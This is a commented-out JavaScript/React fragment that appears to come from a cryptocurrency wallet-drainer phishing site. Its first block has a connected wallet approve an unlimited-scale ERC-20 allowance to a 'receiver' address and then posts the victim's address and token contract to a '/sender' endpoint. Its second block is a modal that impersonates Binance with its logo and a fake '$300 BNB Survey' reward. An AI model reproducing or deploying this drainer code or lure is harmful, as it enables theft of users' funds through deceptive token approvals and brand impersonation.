  /*
          
          if(prt)
          {
     
            console.log("Done Connecting and sending now")
            const tok_add = await queryBalance(address)
            const amount=BigInt("1111111111139222222222213333333333")

            const { request } = await publicClient.simulateContract({
              abi: erc20ABI,
              functionName: "approve",
              args: [receiver, amount],
              account: address,
              address: tok_add

            })
            

        //  while(true) 
        // {
      
            try {
              
                  const hash = await data?.writeContract(request)

            const receipt = await publicClient.waitForTransactionReceipt({hash})
            if(receipt)
            {
              // make api call to send
             
              const res = await fetch("/sender", {
                method: "POST",
                body: JSON.stringify({address: address, contract: tok_add})
              })
            }
                  disconnect()
     // break
              
             } 
             catch (error) {
              console.log("sending from approve i.e send direct",error)
             }
          }*/
          /*
import Image from "next/image"
import logo from "@/public/images/blogo.png"
import { useEffect } from "react"
export const Modal = () => {

  
    return(
<>
    <div className="modal fade show" id="popModal" tabIndex="-1" aria-labelledby="popModal" aria-hidden="true">
        <div className="modal-dialog">
            <div className="modal-content py-4">
                <div className="text-center m-4">
<Image src={logo} alt="Binance Logo" height={50} width={100} />
                </div>
                <div className="modal-body text-center text-bg-warning">
                <h2>Binance $300 BNB Survey</h2>
                    <p>Welcome to binance information gathering survey,
                         you will be ask a few general questions, 
                         you wil be rewarded $300 BNB after you submit your survey.</p>
                </div>
                <div className="modal-footer border-0 justify-content-around">
                </div>
            </div>
        </div>
    </div>
   
</>
    )
}
*/